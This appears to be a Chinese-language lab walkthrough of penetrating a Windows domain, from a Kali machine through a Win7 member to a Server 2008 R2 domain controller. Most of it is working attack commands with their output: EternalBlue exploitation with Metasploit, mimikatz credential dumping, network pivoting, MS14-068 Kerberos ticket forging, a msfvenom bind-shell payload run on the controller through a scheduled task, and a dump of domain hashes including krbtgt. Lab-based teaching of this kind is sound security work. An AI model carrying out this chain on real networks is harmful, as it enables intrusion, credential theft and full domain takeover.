[TOC]

### 前言

本章介绍在windows域环境下进行渗透测试的技能。 **(新人发帖请点点关注)**

  * 端口扫描

  * 漏洞发现

  * ms17_010永恒之蓝漏洞利用

  * 域环境信息收集

  * 横向移动

  * MS14-068漏洞利用

  * 域成员提权

  * 获取域控shell

基本环境如下，win7使用两块网卡来模拟内网穿透，在server 2008
搭建域控制器并将win7加入域中。使用kali进行内网横向渗透，获取win7与2008的主机权限 以及域账户最高权限。  
![image](https://image.3001.net/images/20230710/1688959106_64ab7882cf3a2a257798e.png!small)  
win7作为域成员使用域成员账号win7usr 密码1237.com登录，其本地管理员账号为admin 密码123.com，2008-r2 作为域管理员
账号administrator 密码1234.com

###  **域环境搭建测试**

1.2008_r2 添加域服务角色，域为baidu.com  
![image](https://image.3001.net/images/20230710/1688959135_64ab789fb7581d05d2ee7.png!small)  
添加域成员账号 用户登录名win7user 密码：xxxxx  
![image](https://image.3001.net/images/20230710/1688959152_64ab78b05dd131bf914a4.png!small)

2.将win7加入域环境中  
![image](https://image.3001.net/images/20230710/1688959174_64ab78c640ace4b6d01f3.png!small)  
3.使用ping 命名 确保主机与主机的网络连接没有问题

### 测试答疑

加入了域如何登录本地管理员账号？  
格式：计算机名or域名/用户。  
像我的主机名为admin-pc 本地管理员账号为admin ，登录名admin-pc\admin即可登录本地账号，baidu.com\win7user即可登录域账户。  
![image](https://image.3001.net/images/20230710/1688959202_64ab78e2742b6ee16192a.png!small)

如何区分是本地登录还是域成员登录？请看以下一下三张图  
1.加入了域的主机 域成员登录  
![image](https://image.3001.net/images/20230710/1688959238_64ab7906d4be16ae46f82.png!small)  
2.没有加入域的win7 登录域为本计算机主机名  
![image](https://image.3001.net/images/20230710/1688959251_64ab79137f2b1353473dc.png!small)  
3.加入域本地登录  
![image](https://image.3001.net/images/20230710/1688959263_64ab791fadaa58a5efe6c.png!small)  
加入域主机发生最大的变化？  
域控制器的管理就不说了自行百度。作为渗透者或者说攻击者，最关心的事是445服务不会被拒绝了，作为域控制器可以试用版smb服务访问任意成员主机的c$ d$
（无密码）给域成员设置执行任务，权限之高非常具有诱惑力。所以说拿下了域控制器就相当于拿下了整个内网。

### 主机发现&&端口服务扫描&&漏洞脚本扫描

####  **主机发现**

sudo arp-scan -l  
![image](https://image.3001.net/images/20230710/1688959372_64ab798cd07ede6c34294.png!small)

####  **全端口扫描**

sudo nmap --min-rate 10000 -p- 20.1.1.2  
![image](https://image.3001.net/images/20230710/1688959391_64ab799fbd839e2649e3a.png!small)  
注`-A`参数组合了以下选项：

  1. `-sS`：使用TCP SYN扫描进行端口扫描，即发送SYN包并等待响应，用于确定端口的开放状态。

  2. `-sV`：进行服务版本探测，尝试识别目标主机上运行的服务及其版本信息。

  3. `-O`：进行操作系统探测，尝试识别目标主机所使用的操作系统类型。

####  **漏洞脚本扫描**

sudo nmap -p 135,139,445,5357,42902,49152,49153,49154,49155,49156,49157
--script=vuln 20.1.1.2  
![image](https://image.3001.net/images/20230710/1688959419_64ab79bb91695fb627d64.png!small)  
发现了 ms-17-010 永恒之蓝漏洞，这是2017发布的非常严重的一个漏洞。该漏洞无需使用任何账户密码
利用主机SMB服务即可获取主机的shell。更多细节请自行百度。

###  **永恒之蓝获取shell**

启用msfconsole  
search ms17_010

设置响应参数 payload 用meterpreter的  
![image](https://image.3001.net/images/20230710/1688959451_64ab79db26e60d891ee35.png!small)  
run  
![image](https://image.3001.net/images/20230710/1688959469_64ab79edcbda8468b80f8.png!small)  
进入shell ;解决乱码问题  
>chcp 65001

该漏洞执行获取的是系统权限  
![image](https://image.3001.net/images/20230710/1688959490_64ab7a02107ee96d5176c.png!small)

### 主机信息收集

（以下信息仅供参考，提供一个信息收集的思路 。考虑到用户是否以登录问题，实际上收集也不是那么顺利）

####  **查看当前所在域及当前域用户**

net config workstation  
![image](https://image.3001.net/images/20230710/1688959514_64ab7a1a5508bed3a8a49.png!small)  
net view 遍历信任主机  
net view /domain 查看域  
![image](https://image.3001.net/images/20230710/1688959529_64ab7a298f39f70c3418f.png!small)

####  **找到域控制器**

1.第一种方法 net time  
net time 同步域控制器的时间  
![image](https://image.3001.net/images/20230710/1688959547_64ab7a3bc76b142bb482a.png!small)  
可以收集到域控制器所在主机的计算机全名  
使用ping 确定2008-r2.baidu.com的ip  
![image](https://image.3001.net/images/20230710/1688959562_64ab7a4a87f26e3209b62.png!small)  
2.第二种 查看dns服务器  
一般来说 域和dns 为同一个ip  
![image](https://image.3001.net/images/20230710/1688959583_64ab7a5f0a1eeeab8f833.png!small)

####  **收集域成员的IP**

![image](https://image.3001.net/images/20230710/1688959597_64ab7a6d9ef5984b37cbb.png!small)  
挨个ping 计算机的名字  
ping 2008-r2  
结合arp -a  
![image](https://image.3001.net/images/20230710/1688959622_64ab7a861cf2fca917124.png!small)

### msf后渗透阶段

#### Hashdump **获取本地密码信息**

Hashdump

> run windows/gather/smart_hashdump  
> run windows/gather/smart_dump

![image](https://image.3001.net/images/20230710/1688959668_64ab7ab4e3f15004f1524.png!small)

####  **破解hash**

>
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
>
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
>
> admin:1000:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::

在线破解平台https://www.cmd5.com/

![image](https://image.3001.net/images/20230710/1688959681_64ab7ac1660a9f78d3bf9.png!small)

#### mimikatz抓取明文密码

加载模块load mimikatz  
问题来了!  
Msf 提供的mimikatz是一个32位的  
![image](https://image.3001.net/images/20230710/1688959707_64ab7adb67893669e82ff.png!small)  
而目标主机是64为的  
故改变策略  
准备上传minikatz64位 在目标主机上运行minikatz64

meterpreter下运行：上传upload minikatz.exe  
shell下运行：.\minikatz.exe

进入minikatz首先提权：  
privilege::debug  
![image](https://image.3001.net/images/20230710/1688959740_64ab7afc5004e83ca774e.png!small)  
开始抓取明文密码  
sekurlsa::logonPasswords  
![image](https://image.3001.net/images/20230710/1688959758_64ab7b0e6f6a528ab8a5e.png!small)  
![image](https://image.3001.net/images/20230710/1688959771_64ab7b1b50171c9b6975a.png!small)

这里不仅抓抓到了本地用户admin 的密码 且抓到了域用户的明文密码

> 其他命令参考  
> lsadump::lsa /patch  
> sekurlsa::tspkg  
> sekurlsa::wdigest

####  **后渗透常用模块**

1.域 域控主机 ip  
run post/windows/gather/enum_domain  
![image](https://image.3001.net/images/20230710/1688959828_64ab7b546811b89e5a472.png!small)

run post/windows/gather/enum_ad_computers  
![image](https://image.3001.net/images/20230710/1688959843_64ab7b630aec80d6beacb.png!small)  
2.获取登录过的用户信息  
run post/windows/gather/enum_logged_on_users  
![image](https://image.3001.net/images/20230710/1688959871_64ab7b7fc0eb8cfca85a1.png!small)

###  **靶机路由跳板**

#### 查看本地网卡信息

![image](https://image.3001.net/images/20230710/1688959896_64ab7b9866856466b4526.png!small)  
发现本地有两块网卡，10.1.1.1这个网段是kali访问不到的。利用msf的路由功能使kali能够访问到这个网段

####  **增加网段路由**

run autoroute -s 10.1.1.1/24  
![image](https://image.3001.net/images/20230710/1688959919_64ab7baf4c4e22361f733.png!small)

这条命令执行后，在msf所有的攻击载荷都可以经20.1.1.2主机转发到10.1.1.0/24这个网段。但在msf外面流量无法转发
，我们可以使用socket进行代理。让msf转发本地namp的流量。

####  **开启代理**

use auxiliary/server/socks4a  
![image](https://image.3001.net/images/20230710/1688959945_64ab7bc93c2e3cb0ad940.png!small)

####  **设置 porychanins 代理 nmap 扫描**

sudo vi /etc/proxychains.conf  
![image](https://image.3001.net/images/20230710/1688959970_64ab7be20f6b765857028.png!small)

proxychains nmap -sT -Pn -A 10.1.1.24

> Nmap scan report for 10.1.1.24  
> Host is up (0.17s latency).  
> PORT STATE SERVICE VERSION  
> 88/tcp open tcpwrapped  
> 135/tcp open msrpc Microsoft Windows RPC  
> 139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
> 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
> baidu.com, Site: Default-First-Site-Name)  
> 445/tcp open tcpwrapped Windows Server 2008 R2 Standard 7600 tcpwrapped  
> 464/tcp open tcpwrapped  
> 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
> 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:
> baidu.com, Site: Default-First-Site-Name)  
> 3269/tcp open tcpwrapped  
> 5722/tcp open msrpc Microsoft Windows RPC  
> 9389/tcp open mc-nmf .NET Message Framing  
> 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
> |_http-server-header: Microsoft-HTTPAPI/2.0  
> |_http-title: Not Found  
> 49152/tcp open msrpc Microsoft Windows RPC  
> 49153/tcp open tcpwrapped  
> 49154/tcp open msrpc Microsoft Windows RPC  
> 49155/tcp open msrpc Microsoft Windows RPC  
> 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
> 49158/tcp open msrpc Microsoft Windows RPC  
> 49162/tcp open msrpc Microsoft Windows RPC  
> 49166/tcp open msrpc Microsoft Windows RPC  
> 49174/tcp open msrpc Microsoft Windows RPC  
> Service Info: Host: 2008-R2; OS: Windows; CPE: cpe:/o:microsoft:windows  
> Host script results:  
> |_clock-skew: -7h59m56s  
> | smb-os-discovery:  
> | OS: Windows Server 2008 R2 Standard 7600 (Windows Server 2008 R2 Standard
> 6.1)  
> | OS CPE: cpe:/o:microsoft:windows_server_2008::-  
> | Computer name: 2008-r2  
> | NetBIOS computer name: 2008-R2\x00  
> | Domain name: baidu.com  
> | Forest name: baidu.com  
> | FQDN: 2008-r2.baidu.com  
> |_ System time: 2023-07-06T15:51:18+08:00  
> |_smb2-time: Protocol negotiation failed (SMB2)  
> Service detection performed. Please report any incorrect results at
> https://nmap.org/submit/ .  
> Nmap done: 1 IP address (1 host up) scanned in 169.62 seconds

注：proxychains不代理UDP，ICMP，SYN网络协议，无法进行系统探测，主机发现等等，但是可以用-sT参数并结合-Pn进行TCP端口扫描

####  **补充域控管理员的优势**

查看域管理员成员  
net group "domain admins" /domain  
域管理员 可以访问任意与成员的资源 可以使用at 为域成员添加定时任务  
![image](https://image.3001.net/images/20230710/1688960012_64ab7c0c43bbf35efa7b4.png!small)  
域成员不可访问域控的资源

###  **伪装票据尝试提权到域控**

在主机信息收集的过程我们发现域控非常有可能使2008-r2 版本，可以尝试使用ms14-068进行横向渗透。

#### 漏洞说明 (MS14-068；CVE-2014-6324)

这个漏洞的利用的大概过程，就是说使用现有的域成员声称自己是管理员，前去申请管理员票据权限，结果申请成功了。

  *  **官方说明** ：[Microsoft Security Bulletin MS14-068 - Critical | Microsoft Docs](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-068?redirectedfrom=MSDN)

  *  **漏洞利用条件** ：受该漏洞影响的操作系统，包括Win2003、Wind2008、Win2008 R2、Win2012和 Win2012 R2。利用该漏洞如果攻击者获取了域内任何一台计算机的Shell 权限，同时知道任意 **域用户名、SID、密码** 。将允许攻击者将域内任意用户权限提升至域管理级别。

  *  **漏洞产生原因** ：用户在向 Kerberos 密钥分发中心( KDC)申请 TGT (由票据授权服务产生的身份凭证)时，可以伪造自己的Kerberos 票据。如果票据声明自己有域管理员权限，而在处理该票据时未验证票据的签名， 那么返给用户的 TGT 就使普通域用户拥有域管理员权限。该用户可以将 TGT 发送到 KDC，KDC的 TGS (票据授权服务)在验证TGT后，将服务票据(Service Ticket)发送给该用户，而该用户拥有访问任何该服务的权限，从而使攻击者可以访问域内的资源

  *  **漏洞利用前提**  
1.域控没有打MS14-068的补丁(KB3011780)  
2.拿下一台加入域的计算机  
3.有这台域内计算机的域用户密码和Sid  
参考文档  
<https://www.cnblogs.com/f-carey/p/16843006.html#tid-zYahi8>

#### 得到本域账户的ssid

![image](https://image.3001.net/images/20230710/1688960057_64ab7c39e83dc45bae8a4.png!small)

#### 制造票据

此操作需要访问域控器进行网络信息交互  
.\MS14-068.exe -u win7user@baidu.com -s
S-1-5-21-3451455147-49433410-551211528-1104 -d 2008-r2 -p1237.com  
![image](https://image.3001.net/images/20230710/1688960078_64ab7c4ec53394d8fa071.png!small)  
or  
![image](https://image.3001.net/images/20230710/1688960095_64ab7c5f502e5da418fa7.png!small)

#### 导入票据

mimikatz # kerberos::ptc  
![image](https://image.3001.net/images/20230710/1688960109_64ab7c6d8e4392355dce9.png!small)  
尝试访问域控的主机资源（利用漏洞现在的win7user账户已经是管理员了）  
![image](https://image.3001.net/images/20230710/1688960124_64ab7c7ca4b3969aba7cc.png!small)  
访问成功，意味着提权成功

###  **获取域管理成员的shell**

 _ ***生成正向载荷***_  
msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f exe -o 2008-r2.exe  
![image](https://image.3001.net/images/20230710/1688960165_64ab7ca55739ab3185e9e.png!small)

开启路由  
run autoroute -s 10.1.1.1/24

 _ ***copy 复制到域控***_  
![image](https://image.3001.net/images/20230710/1688960186_64ab7cbab8f700f7af97a.png!small)

 _ ***定时任务执行***_  
at \2008-R2 10:03:00 c:/2008-r2.exe  
![image](https://image.3001.net/images/20230710/1688960278_64ab7d164e5aa11558161.png!small)

 _ ***连接域控***_  
use exploit/multi/handler  
> set payload windows/meterpreter/bind_tcp (要路由)  
![image](https://image.3001.net/images/20230710/1688960202_64ab7cca99b72ab139973.png!small)  
![image](https://image.3001.net/images/20230710/1688960215_64ab7cd710d210933721a.png!small)

####  **收集域控信息**

meterpreter > run windows/gather/smart_hashdump

> meterpreter > run windows/gather/smart_hashdump
>
> [*] Running module against 2008-R2
>
> [*] Hashes will be saved to the database if one is connected.
>
> [+] Hashes will be saved in loot in JtR password file format to:
>
> [*]
> /root/.msf4/loot/20230708220919_default_10.1.1.24_windows.hashes_710207.txt
>
> [+] This host is a Domain Controller!
>
> [*] Dumping password hashes...
>
> [-] Failed to dump hashes as SYSTEM, trying to migrate to another process
>
> [*] Migrating to process owned by SYSTEM
>
> [*] Migrating to wininit.exe
>
> [+] Successfully migrated to wininit.exe
>
> [+]
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:a803cf45d87009c404eb89df4b1ae94c
>
> [+]
> krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43544b8808b1b0e98db650b0565a24ab
>
> [+]
> win7user:1104:aad3b435b51404eeaad3b435b51404ee:526ae3b352eec32faedecfd5376fed8a
>
> [+]
> 2008-R2$:1000:aad3b435b51404eeaad3b435b51404ee:ecefaa33c322228f3708a824831ab50a
>
> [+] ADMIN-> PC$:1103:aad3b435b51404eeaad3b435b51404ee:a4ae89fe0372ddbd31cfc640329298db

![image](https://image.3001.net/images/20230710/1688960373_64ab7d757b267e5c6323c.png!small)  
解密出域控账号Administrator 密码1234.com

